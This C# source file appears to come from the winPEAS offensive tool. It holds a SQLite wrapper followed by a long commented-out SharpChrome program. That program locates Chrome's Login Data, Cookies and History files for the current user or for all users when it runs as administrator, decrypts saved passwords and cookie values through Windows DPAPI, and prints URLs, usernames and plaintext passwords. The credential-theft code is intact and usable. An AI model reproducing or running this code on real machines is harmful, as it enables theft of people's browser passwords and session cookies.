//  $Header$

using System;
using System.Collections;
using System.Data;
using winPEAS._3rdParty.SQLite.src;

namespace winPEAS._3rdParty.SQLite
{

    using sqlite = CSSQLite.sqlite3;
    using Vdbe = CSSQLite.Vdbe;
  /// <summary>
  /// C#-SQLite wrapper with functions for opening, closing and executing queries.
  /// </summary>
    public class SQLiteDatabase
    {
        // pointer to database
        private sqlite db;

        /// <summary>
        /// Creates new instance of SQLiteBase class with no database attached.
        /// </summary>
        public SQLiteDatabase()
        {
            db = null;
        }
        /// <summary>
        /// Creates new instance of SQLiteDatabase class and opens database with given name.
        /// </summary>
        /// <param name="DatabaseName">Name (and path) to SQLite database file</param>
        public SQLiteDatabase( String DatabaseName )
        {
            OpenDatabase( DatabaseName );
        }

        /// <summary>
        /// Opens database. 
        /// </summary>
        /// <param name="DatabaseName">Name of database file</param>
        public void OpenDatabase( String DatabaseName )
        {
            // opens database 
            if ( CSSQLite.sqlite3_open( DatabaseName, ref db ) != CSSQLite.SQLITE_OK )
            {
            // if there is some error, database pointer is set to 0 and exception is throws
            db = null;
            throw new Exception( "Error with opening database " + DatabaseName + "!" );
            }
        }

        /// <summary>
        /// Closes opened database.
        /// </summary>
        public void CloseDatabase()
        {
            // closes the database if there is one opened
            if ( db != null )
            {
            CSSQLite.sqlite3_close( db );
            }
        }

        /// <summary>
        /// Returns connection
        /// </summary>
        public sqlite Connection()
        {
            return db;
        }

        /// <summary>
        /// Returns the list of tables in opened database.
        /// </summary>
        /// <returns></returns>
        public ArrayList GetTables()
        {
            // executes query that select names of all tables in master table of the database
            String query = "SELECT name FROM sqlite_master " +
                                        "WHERE type = 'table'" +
                                        "ORDER BY 1";
            DataTable table = ExecuteQuery( query );

            // Return all table names in the ArrayList
            ArrayList list = new ArrayList();
            foreach ( DataRow row in table.Rows )
            {
            list.Add( row.ItemArray[0].ToString() );
            }
            return list;
        }

        /// <summary>
        /// Executes query that does not return anything (e.g. UPDATE, INSERT, DELETE).
        /// </summary>
        /// <param name="query"></param>
        public void ExecuteNonQuery( String query )
        {
            // calles SQLite function that executes non-query
            CSSQLite.sqlite3_exec( db, query, 0, 0, 0 );
            // if there is error, excetion is thrown
            if ( db.errCode != CSSQLite.SQLITE_OK )
            throw new Exception( "Error with executing non-query: \"" + query + "\"!\n" + CSSQLite.sqlite3_errmsg( db ) );
        }

        /// <summary>
        /// Executes query that does return something (e.g. SELECT).
        /// </summary>
        /// <param name="query"></param>
        /// <returns></returns>
        public DataTable ExecuteQuery( String query )
        {
            // compiled query
            SQLiteVdbe statement = new SQLiteVdbe(this, query);

            // table for result of query
            DataTable table = new DataTable();

            // create new instance of DataTable with name "resultTable"
            table = new DataTable( "resultTable" );

            // reads rows
            do { } while ( ReadNextRow( statement.VirtualMachine(), table ) == CSSQLite.SQLITE_ROW );
            // finalize executing this query
            statement.Close();
            // returns table
            return table;
        }

        // private function for reading rows and creating table and columns
        private int ReadNextRow( Vdbe vm, DataTable table )
        {
            int columnCount = table.Columns.Count;
            if ( columnCount == 0 )
            {
            if ( ( columnCount = ReadColumnNames( vm, table ) ) == 0 ) return CSSQLite.SQLITE_ERROR;
            }

            int resultType;
            if ( ( resultType = CSSQLite.sqlite3_step( vm) ) == CSSQLite.SQLITE_ROW )
            {
            object[] columnValues = new object[columnCount];

            for ( int i = 0 ; i < columnCount ; i++ )
            {
                int columnType = CSSQLite.sqlite3_column_type( vm, i );
                switch ( columnType )
                {
                case CSSQLite.SQLITE_INTEGER:
                    {
                    columnValues[i] = CSSQLite.sqlite3_column_int( vm, i );
                    break;
                    }
                case CSSQLite.SQLITE_FLOAT:
                    {
                    columnValues[i] = CSSQLite.sqlite3_column_double( vm, i );
                    break;
                    }
                case CSSQLite.SQLITE_TEXT:
                    {
                    columnValues[i] = CSSQLite.sqlite3_column_text( vm, i );
                    break;
                    }
                case CSSQLite.SQLITE_BLOB:
                            {
                                // Something goes wrong between adding this as a column value and converting to a row value.
                                byte[] encBlob = CSSQLite.sqlite3_column_blob(vm, i);
                                string base64 = Convert.ToBase64String(encBlob);
                                //byte[] decPass = ProtectedData.Unprotect(encBlob, null, DataProtectionScope.CurrentUser);
                                //string password = Encoding.ASCII.GetString(decPass);
                                //columnValues[i] = password;
                                columnValues[i] = base64;
                                
                    break;
                    }
                default:
                    {
                    columnValues[i] = "";
                    break;
                    }
                }
            }
            table.Rows.Add( columnValues );
            }
            return resultType;
        }
        // private function for creating Column Names
        // Return number of colums read
        private int ReadColumnNames( Vdbe vm, DataTable table )
        {

            String columnName = "";
            int columnType = 0;
            // returns number of columns returned by statement
            int columnCount = CSSQLite.sqlite3_column_count( vm );
            object[] columnValues = new object[columnCount];

            try
            {
            // reads columns one by one
            for ( int i = 0 ; i < columnCount ; i++ )
            {
                columnName = CSSQLite.sqlite3_column_name( vm, i );
                columnType = CSSQLite.sqlite3_column_type( vm, i );
                switch ( columnType )
                {
                case CSSQLite.SQLITE_INTEGER:
                    {
                    // adds new integer column to table
                    table.Columns.Add( columnName, Type.GetType( "System.Int64" ) );
                    break;
                    }
                case CSSQLite.SQLITE_FLOAT:
                    {
                    table.Columns.Add( columnName, Type.GetType( "System.Double" ) );
                    break;
                    }
                case CSSQLite.SQLITE_TEXT:
                    {
                    table.Columns.Add( columnName, typeof(string) );
                    break;
                    }
                case CSSQLite.SQLITE_BLOB:
                    {
                    table.Columns.Add( columnName, typeof(byte[]) );
                    break;
                    }
                default:
                    {
                    table.Columns.Add( columnName, Type.GetType( "System.String" ) );
                    break;
                    }
                }
            }
            }
            catch
            {
            return 0;
            }
            return table.Columns.Count;
        }

    }

}

//namespace SharpChrome
//{
//    using CS_SQLite3;
//    class Program
//    {
//        static void Usage()
//        {
//            string banner = @"
//Usage:
//    .\sharpchrome.exe arg0 [arg1 arg2 ...]

//Arguments:
//    all       - Retrieve all Chrome Bookmarks, History, Cookies and Logins.
//    full      - The same as 'all'
//    logins    - Retrieve all saved credentials that have non-empty passwords.
//    history   - Retrieve user's history with a count of each time the URL was
//                visited, along with cookies matching those items.
//    cookies [domain1.com domain2.com] - Retrieve the user's cookies in JSON format.
//                                        If domains are passed, then return only
//                                        cookies matching those domains.
//";

//            Console.WriteLine(banner);
//        }
//        static void Main(string[] args)
//        {
//            // Path builder for Chrome install location
//            string homeDrive = System.Environment.GetEnvironmentVariable("HOMEDRIVE");
//            string homePath = System.Environment.GetEnvironmentVariable("HOMEPATH");
//            string localAppData = System.Environment.GetEnvironmentVariable("LOCALAPPDATA");

//            string[] paths = new string[2];
//            paths[0] = homeDrive + homePath + "\\Local Settings\\Application Data\\Google\\Chrome\\User Data";
//            paths[1] = localAppData + "\\Google\\Chrome\\User Data";
//            //string chromeLoginDataPath = "C:\\Users\\Dwight\\Desktop\\Login Data";

//            string[] validArgs = { "all", "full", "logins", "history", "cookies" };

//            bool getCookies = false;
//            bool getHistory = false;
//            bool getBookmarks = false;
//            bool getLogins = false;
//            bool useTmpFile = false;
//            // For filtering cookies
//            List<String> domains = new List<String>();

//            if (args.Length == 0)
//            {
//                Usage();
//                return;
//            }

//            // Parse the arguments.
//            for(int i=0; i < args.Length; i++)
//            {
//                // Valid arg!
//                string arg = args[i].ToLower();
//                if (Array.IndexOf(validArgs, arg) != -1)
//                {
//                    if (arg == "all" || arg == "full")
//                    {
//                        getCookies = true;
//                        getHistory = true;
//                        getLogins = true;
//                    }
//                    else if (arg == "logins")
//                    {
//                        getLogins = true;
//                    }
//                    else if (arg == "history")
//                    {
//                        getHistory = true;
//                    }
//                    else if (arg == "cookies")
//                    {
//                        getCookies = true;
//                    }
//                    else
//                    {
//                        Console.WriteLine("[X] Invalid argument passed: {0}", arg);
//                    }
//                }
//                else if (getCookies && arg.Contains("."))
//                {
//                    // must be a domain!
//                    domains.Add(arg);
//                }
//                else
//                {
//                    Console.WriteLine("[X] Invalid argument passed: {0}", arg);
//                }
//            }
//            string[] domainArray = domains.ToArray();

//            if (!getCookies && !getHistory && !getLogins)
//            {
//                Usage();
//                return;
//            }

//            // If Chrome is running, we'll need to clone the files we wish to parse.
//            Process[] chromeProcesses = Process.GetProcessesByName("chrome");
//            if (chromeProcesses.Length > 0)
//            {
//                useTmpFile = true;
//            }

//            //foreach(string path in paths)
//            //{

//            //}
//            //GetLogins(chromeLoginDataPath);

//            // Main loop, path parsing and high integrity check taken from GhostPack/SeatBelt
//            try
//            {
//                if (IsHighIntegrity())
//                {
//                    Console.WriteLine("\r\n\r\n=== Chrome (All Users) ===");

//                    string userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
//                    string[] dirs = Directory.GetDirectories(userFolder);
//                    foreach (string dir in dirs)
//                    {
//                        string[] parts = dir.Split('\\');
//                        string userName = parts[parts.Length - 1];
//                        if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
//                        {
//                            string userChromeHistoryPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History", dir);
//                            string userChromeBookmarkPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks", dir);
//                            string userChromeLoginDataPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", dir);
//                            string userChromeCookiesPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", dir);
//                            // History parse
//                            if (useTmpFile)
//                            {
//                                if (getCookies)
//                                {
//                                    userChromeCookiesPath = CreateTempFile(userChromeCookiesPath);
//                                    if (domainArray.Length > 0)
//                                    {
//                                        HostCookies[] cookies = ParseChromeCookies(userChromeCookiesPath, userName, true, domainArray);
//                                    }
//                                    else
//                                    {
//                                        HostCookies[] cookies = ParseChromeCookies(userChromeCookiesPath, userName, true);
//                                    }
//                                    File.Delete(userChromeCookiesPath);
//                                }

//                                if (getHistory)
//                                {
//                                    userChromeCookiesPath = CreateTempFile(userChromeCookiesPath);
//                                    HostCookies[] cookies = ParseChromeCookies(userChromeCookiesPath, userName);
//                                    File.Delete(userChromeCookiesPath);
//                                    userChromeHistoryPath = CreateTempFile(userChromeHistoryPath);
//                                    ParseChromeHistory(userChromeHistoryPath, userName, cookies);
//                                    File.Delete(userChromeHistoryPath);
//                                }

//                                if (getLogins)
//                                {
//                                    userChromeLoginDataPath = CreateTempFile(userChromeLoginDataPath);
//                                    ParseChromeLogins(userChromeLoginDataPath, userName);
//                                    File.Delete(userChromeLoginDataPath);
//                                }
//                            }
//                            else
//                            {
//                                if (getCookies)
//                                {
//                                    if (domainArray.Length > 0)
//                                    {
//                                        ParseChromeCookies(userChromeCookiesPath, userName, true, domainArray);
//                                    }
//                                    else
//                                    {
//                                        ParseChromeCookies(userChromeCookiesPath, userName, true);
//                                    }
//                                }

//                                if (getHistory)
//                                {
//                                    HostCookies[] cookies = ParseChromeCookies(userChromeCookiesPath, userName);
//                                    ParseChromeHistory(userChromeHistoryPath, userName, cookies);
//                                }

//                                if (getLogins)
//                                {
//                                    ParseChromeLogins(userChromeLoginDataPath, userName);
//                                }
//                            }
//                        }
//                    }
//                }
//                else
//                {
//                    Console.WriteLine("\r\n\r\n=== Chrome (Current User) ===");
//                    string userChromeHistoryPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History", System.Environment.GetEnvironmentVariable("USERPROFILE"));
//                    string userChromeBookmarkPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks", System.Environment.GetEnvironmentVariable("USERPROFILE"));
//                    //ParseChromeBookmarks(userChromeBookmarkPath, System.Environment.GetEnvironmentVariable("USERNAME"));
//                    string userChromeCookiesPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", System.Environment.GetEnvironmentVariable("USERPROFILE"));
//                    string userChromeLoginDataPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", System.Environment.GetEnvironmentVariable("USERPROFILE"));
//                    //ParseChromeLogins(userChromeLoginDataPath, System.Environment.GetEnvironmentVariable("USERNAME"));
//                    if (useTmpFile)
//                    {
//                        if (getCookies)
//                        {
//                            userChromeCookiesPath = CreateTempFile(userChromeCookiesPath);
//                            if (domainArray.Length > 0)
//                            {
//                                ParseChromeCookies(userChromeCookiesPath, System.Environment.GetEnvironmentVariable("USERNAME"), true, domainArray);
//                            }
//                            else
//                            {
//                                ParseChromeCookies(userChromeCookiesPath, System.Environment.GetEnvironmentVariable("USERNAME"), true);
//                            }
//                            File.Delete(userChromeCookiesPath);
//                        }

//                        if (getHistory)
//                        {
//                            userChromeCookiesPath = CreateTempFile(userChromeCookiesPath);
//                            HostCookies[] cookies = ParseChromeCookies(userChromeCookiesPath, System.Environment.GetEnvironmentVariable("USERNAME"));
//                            File.Delete(userChromeCookiesPath);
//                            userChromeHistoryPath = CreateTempFile(userChromeHistoryPath);
//                            ParseChromeHistory(userChromeHistoryPath, System.Environment.GetEnvironmentVariable("USERNAME"), cookies);
//                            File.Delete(userChromeHistoryPath);
//                        }

//                        if (getLogins)
//                        {
//                            userChromeLoginDataPath = CreateTempFile(userChromeLoginDataPath);
//                            ParseChromeLogins(userChromeLoginDataPath, System.Environment.GetEnvironmentVariable("USERNAME"));
//                            File.Delete(userChromeLoginDataPath);
//                        }
//                    }
//                    else
//                    {
//                        if (getCookies)
//                        {
//                            if (domainArray.Length > 0)
//                            {
//                                ParseChromeCookies(userChromeCookiesPath, System.Environment.GetEnvironmentVariable("USERNAME"), true, domainArray);
//                            }
//                            else
//                            {
//                                ParseChromeCookies(userChromeCookiesPath, System.Environment.GetEnvironmentVariable("USERNAME"), true);
//                            }
//                        }

//                        if (getHistory)
//                        {
//                            HostCookies[] cookies = ParseChromeCookies(userChromeCookiesPath, System.Environment.GetEnvironmentVariable("USERNAME"));
//                            ParseChromeHistory(userChromeHistoryPath, System.Environment.GetEnvironmentVariable("USERNAME"), cookies);
//                        }

//                        if (getLogins)
//                        {
//                            ParseChromeLogins(userChromeLoginDataPath, System.Environment.GetEnvironmentVariable("USERNAME"));
//                        }
//                    }
//                }
//            }
//            catch (Exception ex)
//            {
//                Console.WriteLine("  [X] Exception: {0}", ex.Message);
//            }
//            //Thread.Sleep(100000);
//        }

//        public static string CreateTempFile(string filePath)
//        {
//            string localAppData = System.Environment.GetEnvironmentVariable("LOCALAPPDATA");
//            string newFile = "";
//            newFile = Path.GetRandomFileName();
//            string tempFileName = localAppData + "\\Temp\\" + newFile;
//            File.Copy(filePath, tempFileName);
//            return tempFileName;
//        }

//        public class Cookie
//        {
//            private string _domain;
//            private long _expirationDate;
//            private bool _hostOnly;
//            private bool _httpOnly;
//            private string _name;
//            private string _path;
//            private string _sameSite;
//            private bool _secure;
//            private bool _session;
//            private string _storeId;
//            private string _value;
//            private int _id;

//            // Getters and setters
//            public string Domain
//            {
//                get { return _domain; }
//                set { _domain = value; }
//            }
//            public long ExpirationDate
//            {
//                get { return _expirationDate; }
//                set { _expirationDate = value; }
//            }
//            public bool HostOnly
//            {
//                get { return _hostOnly; }
//                set { _hostOnly = value; }
//            }
//            public bool HttpOnly
//            {
//                get { return _httpOnly; }
//                set { _httpOnly = value; }
//            }
//            public string Name
//            {
//                get { return _name; }
//                set { _name = value; }
//            }
//            public string Path
//            {
//                get { return _path; }
//                set { _path = value; }
//            }
//            public string SameSite
//            {
//                get { return _sameSite; }
//                set { _sameSite = value; }
//            }
//            public bool Secure
//            {
//                get { return _secure; }
//                set { _secure = value; }
//            }
//            public bool Session
//            {
//                get { return _session; }
//                set { _session = value; }
//            }
//            public string StoreId
//            {
//                get { return _storeId; }
//                set { _storeId = value; }
//            }
//            public string Value
//            {
//                get { return _value; }
//                set { _value = value; }
//            }
//            public int Id
//            {
//                get { return _id; }
//                set { _id = value; }
//            }

//            public string ToJSON()
//            {
//                Type type = this.GetType();
//                PropertyInfo[] properties = type.GetProperties();
//                string[] jsonItems = new string[properties.Length]; // Number of items in EditThisCookie
//                for(int i = 0; i < properties.Length; i++)
//                {
//                    PropertyInfo property = properties[i];
//                    object[] keyvalues = { property.Name[0].ToString().ToLower() + property.Name.Substring(1, property.Name.Length-1), property.GetValue(this, null) };
//                    string jsonString = "";
//                    if (keyvalues[1].GetType() == typeof(String))
//                    {
//                        jsonString = String.Format("\"{0}\": \"{1}\"", keyvalues);
//                    }
//                    else if (keyvalues[1].GetType() == typeof(Boolean))
//                    {
//                        keyvalues[1] = keyvalues[1].ToString().ToLower();
//                        jsonString = String.Format("\"{0}\": {1}", keyvalues);
//                    }
//                    else
//                    {
//                        jsonString = String.Format("\"{0}\": {1}", keyvalues);
//                    }
//                    jsonItems[i] = jsonString;
//                }
//                string results = "{" + String.Join(", ", jsonItems) + "}"; 
//                return results;
//            }
//        }

//        public class HostCookies
//        {
//            private Cookie[] _cookies;
//            private string _hostName;

//            public Cookie[] Cookies
//            {
//                get { return _cookies; }
//                set { _cookies = value; }
//            }

//            public string HostName
//            {
//                get { return _hostName; }
//                set { _hostName = value; }
//            }

//            public string ToJSON()
//            {
//                string[] jsonCookies = new string[this.Cookies.Length];
//                for(int i=0; i < this.Cookies.Length; i++)
//                {
//                    this.Cookies[i].Id = i+1;
//                    jsonCookies[i] = this.Cookies[i].ToJSON();
//                }
//                return "[" + String.Join(",", jsonCookies) + "]";
//            }
//        }

//        public static HostCookies[] SortCookieData(DataTable cookieTable)
//        {
//            List<Cookie> cookies = new List<Cookie>();
//            List<HostCookies> hostCookies = new List<HostCookies>();
//            HostCookies hostInstance = null;
//            string lastHostKey = "";
//            foreach(DataRow row in cookieTable.Rows)
//            {
//                if (lastHostKey != (string)row["host_key"])
//                {
//                    lastHostKey = (string)row["host_key"];
//                    if (hostInstance != null)
//                    {
//                        hostInstance.Cookies = cookies.ToArray();
//                        hostCookies.Add(hostInstance);
//                    }
//                    hostInstance = new HostCookies();
//                    hostInstance.HostName = lastHostKey;
//                    cookies = new List<Cookie>();
//                }
//                Cookie cookie = new Cookie();
//                cookie.Domain = row["host_key"].ToString();
//                long expDate;
//                Int64.TryParse(row["expires_utc"].ToString(), out expDate);
//                cookie.ExpirationDate = expDate;
//                cookie.HostOnly = false; // I'm not sure this is stored in the cookie store and seems to be always false
//                if (row["is_httponly"].ToString() == "1")
//                {
//                    cookie.HttpOnly = true;
//                }
//                else
//                {
//                    cookie.HttpOnly = false;
//                }
//                cookie.Name = row["name"].ToString();
//                cookie.Path = row["path"].ToString();
//                cookie.SameSite = "no_restriction"; // Not sure if this is the same as firstpartyonly
//                if (row["is_secure"].ToString() == "1")
//                {
//                    cookie.Secure = true;
//                }
//                else
//                {
//                    cookie.Secure = false;
//                }
//                cookie.Session = false; // Unsure, this seems to be false always
//                cookie.StoreId = "0"; // Static
//                byte[] cookieValue = Convert.FromBase64String(row["encrypted_value"].ToString());
//                cookieValue = ProtectedData.Unprotect(cookieValue, null, DataProtectionScope.CurrentUser);
//                cookie.Value = System.Text.Encoding.ASCII.GetString(cookieValue);
//                cookies.Add(cookie);
//            }
//            return hostCookies.ToArray();
//        }

//        private bool CookieHostNameMatch(HostCookies cookie, string hostName)
//        {
//            return cookie.HostName == hostName;
//        }

//        public static HostCookies FilterHostCookies(HostCookies[] hostCookies, string url)
//        {
//            HostCookies results = new HostCookies();
//            List<String> hostPermutations = new List<String>();
//            // First retrieve the domain from the url
//            string domain = url;
//            // determine if url or raw domain name
//            if (domain.IndexOf('/') != -1)
//            {
//                domain = domain.Split('/')[2];
//            }
//            results.HostName = domain;
//            string[] domainParts = domain.Split('.');
//            for(int i=0; i < domainParts.Length; i++)
//            {
//                if ((domainParts.Length - i) < 2)
//                {
//                    // We've reached the TLD. Break!
//                    break;
//                }
//                string[] subDomainParts = new string[domainParts.Length - i];
//                Array.Copy(domainParts, i, subDomainParts, 0, subDomainParts.Length);
//                string subDomain = String.Join(".", subDomainParts);
//                hostPermutations.Add(subDomain);
//                hostPermutations.Add("." + subDomain);
//            }
//            List<Cookie> cookies = new List<Cookie>();
//            foreach(string sub in hostPermutations)
//            {
//                // For each permutation
//                foreach(HostCookies hostInstance in hostCookies)
//                {
//                    // Determine if the hostname matches the subdomain perm
//                    if (hostInstance.HostName == sub)
//                    {
//                        // If it does, cycle through
//                        foreach(Cookie cookieInstance in hostInstance.Cookies)
//                        {
//                            // No dupes
//                            if (!cookies.Contains(cookieInstance))
//                            {
//                                cookies.Add(cookieInstance);
//                            }
//                        }
//                    }
//                }
//            }
//            results.Cookies = cookies.ToArray();
//            return results;

//        }

//        public static HostCookies[] ParseChromeCookies(string cookiesFilePath, string user, bool printResults = false, string[] domains = null)
//        {
//            SQLiteDatabase database = new SQLiteDatabase(cookiesFilePath);
//            string query = "SELECT * FROM cookies ORDER BY host_key";
//            DataTable resultantQuery = database.ExecuteQuery(query);
//            database.CloseDatabase();
//            // This will group cookies based on Host Key
//            HostCookies[] rawCookies = SortCookieData(resultantQuery);
//            if (printResults)
//            {
//                if (domains != null)
//                {
//                    foreach(string domain in domains)
//                    {
//                        HostCookies hostInstance = FilterHostCookies(rawCookies, domain);
//                        Console.WriteLine("--- Chrome Cookie (User: {0}) ---", user);
//                        Console.WriteLine("Domain         : {0}", hostInstance.HostName);
//                        Console.WriteLine("Cookies (JSON) : {0}", hostInstance.ToJSON());
//                        Console.WriteLine();
//                    }
//                }
//                else
//                {
//                    foreach (HostCookies cookie in rawCookies)
//                    {
//                        Console.WriteLine("--- Chrome Cookie (User: {0}) ---", user);
//                        Console.WriteLine("Domain         : {0}", cookie.HostName);
//                        Console.WriteLine("Cookies (JSON) : {0}", cookie.ToJSON());
//                        Console.WriteLine();
//                    }
//                }
//            }
//            // Parse the raw cookies into HostCookies that are grouped by common domain
//            return rawCookies;
//        }

//        public static void ParseChromeHistory(string historyFilePath, string user, HostCookies[] cookies)
//        {
//            SQLiteDatabase database = new SQLiteDatabase(historyFilePath);
//            string query = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY visit_count;";
//            DataTable resultantQuery = database.ExecuteQuery(query);
//            database.CloseDatabase();
//            foreach (DataRow row in resultantQuery.Rows)
//            {
//                var lastVisitTime = row["last_visit_time"];
//                Console.WriteLine("--- Chrome History (User: {0}) ---", user);
//                Console.WriteLine("URL           : {0}", row["url"]);
//                if (row["title"] != String.Empty)
//                {
//                    Console.WriteLine("Title         : {0}", row["title"]);
//                }
//                else
//                {
//                    Console.WriteLine("Title         : No Title");
//                }
//                Console.WriteLine("Visit Count   : {0}", row["visit_count"]);
//                HostCookies matching = FilterHostCookies(cookies, row["url"].ToString());
//                Console.WriteLine("Cookies       : {0}", matching.ToJSON());
//                Console.WriteLine();
//            }
//        }

//        public static void ParseChromeLogins(string loginDataFilePath, string user)
//        {
//            SQLiteDatabase database = new SQLiteDatabase(loginDataFilePath);
//            string query = "SELECT action_url, username_value, password_value FROM logins";
//            DataTable resultantQuery = database.ExecuteQuery(query);

//            foreach (DataRow row in resultantQuery.Rows)
//            {
//                byte[] passwordBytes = Convert.FromBase64String((string)row["password_value"]);
//                byte[] decBytes = ProtectedData.Unprotect(passwordBytes, null, DataProtectionScope.CurrentUser);
//                string password = Encoding.ASCII.GetString(decBytes);
//                if (password != String.Empty)
//                {
//                    Console.WriteLine("--- Chrome Credential (User: {0}) ---", user);
//                    Console.WriteLine("URL      : {0}", row["action_url"]);
//                    Console.WriteLine("Username : {0}", row["username_value"]);
//                    Console.WriteLine("Password : {0}", password);
//                    Console.WriteLine();
//                }
//            }
//            database.CloseDatabase();
//        }

//        public static bool IsHighIntegrity()
//        {
//            // returns true if the current process is running with adminstrative privs in a high integrity context
//            WindowsIdentity identity = WindowsIdentity.GetCurrent();
//            WindowsPrincipal principal = new WindowsPrincipal(identity);
//            return principal.IsInRole(WindowsBuiltInRole.Administrator);
//        }
//    }
//}
